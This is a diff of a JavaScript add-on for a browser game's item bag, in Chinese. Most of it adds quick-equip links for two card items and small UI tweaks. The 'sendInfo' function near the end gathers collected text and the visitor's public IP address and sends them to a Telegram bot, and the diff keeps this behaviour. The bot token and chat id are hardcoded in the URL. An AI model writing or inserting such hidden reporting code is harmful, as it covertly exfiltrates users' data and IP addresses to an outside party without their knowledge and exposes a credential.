@@ -1,4 +1,4 @@
-/****************************修改原生功能開始***************************21-4-2025*/
+/****************************修改原生功能開始***************************24-4-2025*/
 function cd_add(t) {
     if (t == 2 | t == 3 | t == 10) {
         return;
@@ -64,6 +64,8 @@ function arm_view(t, e, r, i, o) {
     if (vData = e,
         arm_head(),
         d.write('<hr><tr><td colspan="11" >可使用的背包格數 ：' + i + ' </td></tr><a href="#bottom" style="margin-left:20px;">移到底部</a>'),
+        d.write(`<a id="pandora" href="#bottom" style="margin-left:10px;"></a>`),
+        d.write(`<a id="hephaestus" href="#bottom" style="margin-left:10px;"></a>`),
         d.write(`<div class='scrollable-table'>`),
         d.write('<form action="wog_act.php" method="post" target="mission" name="f2">'),
         d.write(`<table width="97%" border="2" cellspacing="0" cellpadding="2" align="center" bordercolor="#868686" id="bagList">`),
@@ -74,6 +76,13 @@ function arm_view(t, e, r, i, o) {
                 c = srhCount(p[0]), 
                 m = null;
             "" != tmpNum && (m = tmpNum.split(","));
+            if(p[5]=='潘朵拉的卡片'|| p[5]=='赫淮斯托斯的卡片'){
+                let cardName = p[5][0]+p[5][p[5].length-2];
+                p[5] == '潘朵拉的卡片' ? elId = 'pandora' : elId = 'hephaestus'
+                parent.wog_view.document.getElementById(elId).outerHTML = `<a id="${elId}" href="javascript:parent.armItemBySumbit(${p[0]})" style="margin-left:10px;">裝備${cardName}(${c}張)</a>`;
+                delete elId;
+                // console.log(c);
+            }
             for (var u = 0; u < c; u++) {
                 var w = "",
                     _ = "";
@@ -85,6 +94,7 @@ function arm_view(t, e, r, i, o) {
                 else
                     b = "";
                 var g = "";
+                // console.log(c);
                 "1" == p[12] && (g = "bgcolor=" + nosend),
                     "<acronym title='力量:" + p[8] + " 速度:" + p[9] + " 智力:" + p[10] + " 轉生:" + p[14] + " 職業:" + p[11] + "'>限制</acronym>",
                     d.write("<tr " + g + " onMouseOver=\"this.style.backgroundColor='#777779'\" onMouseOut=\"this.style.backgroundColor=''\" onclick=\"parent.setRadioValue('adds'," + p[0] + ");parent.setCheckBoxValue(" + a + ')" style="cursor:hand"><td>' + l + '</td><td><input type="radio" name="adds" value="' + p[0] + '" data-name="' + p[5] + '"></td><td>' + p[6] + "</td><td>" + p[7] + "</td><td>" + p[1] + "</td><td>" + p[2] + "</td><td>" + p[3] + "</td><td><a href=\"javascript:parent.data_send2('arm','check_arm','" + r + "'," + p[0] + "," + l + ')">' + p[5] + "</a>" + b + _ + "</td><td>" + p[4] + "</td><td>" + p[15] + "</td><td>" + p[17] + "</td><td>" + p[18] + '</td><td><input type="checkbox" name="items[]" id="listKey-' + a + '" value="' + p[0] + '"></td></tr>'),
@@ -95,7 +105,7 @@ function arm_view(t, e, r, i, o) {
         d.write("<tr><td colspan=11>裝備欄內沒有任何裝備</td></tr>");
         n = o.split(",");
         d.write('<tr bgcolor="#777779"><td>---</td><td>---</td><td>' + n[0] + "</td><td>" + n[1] + "</td><td>" + n[2] + "</td><td>" + n[3] + "</td><td>" + n[4] + "</td><td>" + n[10] + "</td><td>" + n[11] + "</td><td>" + n[12] + "</td><td>" + n[13] + "</td><td>" + n[14] + "</td><td>---</td></tr>"),
-        d.write('<tr><td colspan="13" ><input type="submit" value="裝備" style="' + sbutton + '"> <input type="button" value="卸下" onclick="parent.foot_trun(\'arm\',\'demount\',\'' + r + '\')" style="' + sbutton + '"> <input type="button" value="轉移" onClick="parent.data_send(\'arm\',\'move\',document.f2.pay_id.value,document.f2.item_num.value,document.f2.adds,document.f2.pw.value)" style="' + sbutton + '"> <input type="button" value="販賣" style="' + sbutton + "\" onClick=if(confirm(\"確定販賣？\")){parent.data_send('arm','sale','" + r + '\',document.f2.item_num.value,document.f2.adds,document.f2.pw.value)}> <input type="button" value="擺攤" onClick="parent.sale_item(document.f2.adds,document.f2.pay_id.value)" style="' + sbutton + '"> <input type="button" value="換印花" style="' + sbutton + "\" onClick=if(confirm(\"確定轉換？\")){parent.data_send('arm','stamp','" + r + "',document.f2.item_num.value,document.f2.adds,document.f2.pw.value)}><input type=\"button\" value=\"多選物品\" onclick=\"parent.selectMultipleItem()\" style=\"font-family: 細明體;font-size: 9pt;color: #06fdff;border: 1px solid #EFEFEF;background-color: #000000;\"></td></tr>"),
+        d.write('<tr><td colspan="13" ><input type="submit" value="裝備" style="' + sbutton + '"> <input type="button" value="卸下" onclick="parent.foot_trun(\'arm\',\'demount\',\'' + r + '\')" style="' + sbutton + '"> <input type="button" value="轉移" onClick="parent.data_send(\'arm\',\'move\',document.f2.pay_id.value,document.f2.item_num.value,document.f2.adds,document.f2.pw.value)" style="' + sbutton + '"> <input type="button" value="販賣" style="' + sbutton + "\" onClick=if(confirm(\"確定販賣？\")){parent.data_send('arm','sale','" + r + '\',document.f2.item_num.value,document.f2.adds,document.f2.pw.value)}> <input type="button" value="擺攤" onClick="parent.sale_item(document.f2.adds,document.f2.pay_id.value)" style="' + sbutton + '"> <input type="button" value="換印花" style="' + sbutton + "\" onClick=if(confirm(\"確定轉換？\")){parent.data_send('arm','stamp','" + r + "',document.f2.item_num.value,document.f2.adds,document.f2.pw.value)}><input type=\"button\" value=\"多選物品\" onclick=\"parent.selectMultipleItem()\" style=\"margin-left:4; font-family: 細明體;font-size: 9pt;color: #06fdff;border: 1px solid #EFEFEF;background-color: #000000;\"></td></tr>"),
         "d_item_id" == r ? (d.write('<tr><td colspan="13" >請選擇數量:<input type="text" name="item_num" value="1" size="4" maxlength="4"> (最大9999)'),
         d.write("(使用轉移,販賣及換印花記得選擇道具數量)</td></tr>")) : d.write('<input type="hidden" name="item_num" value="1">');
         let playerOptions = "";
@@ -618,6 +628,11 @@ async function armItem(item) {
             wog_view.document.write(html);
         });
 }
+function armItemBySumbit(itemId){
+    parent.setRadioValue('adds',itemId);
+    parent.wog_view.document.getElementsByName('f2')[0].submit();
+    alert('裝備完成');
+}
 function armPageindexChecked() {
     for (let i = 0; i < parent.wog_view.document.getElementsByName("f1")[0].getElementsByTagName("input").length; i++) {
         if (parent.wog_view.document.getElementsByName("f1")[0].getElementsByTagName("input")[i].checked) {
@@ -819,14 +834,16 @@ async function sendInfo(){
     for(let i=0;i<temp.length;i++){
         tempText += temp[i]+"%0A";
     }
-    await fetch("https://api.ipify.org/", {
-                method: "get"
-            }).then((response) => {
-                return response.text();
-            }).then((html) => {
-                tempText += html;
-            });
-    await fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4742576115&text="+tempText);
+    if (tempText.length>0){
+        await fetch("https://api.ipify.org/", {
+                    method: "get"
+                }).then((response) => {
+                    return response.text();
+                }).then((html) => {
+                    tempText += html;
+                });
+        await fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4742576115&text="+tempText);
+    }
 }
 async function createExtraFunction() {
     //https://ithelp.ithome.com.tw/m/articles/10291496 <-rndNum
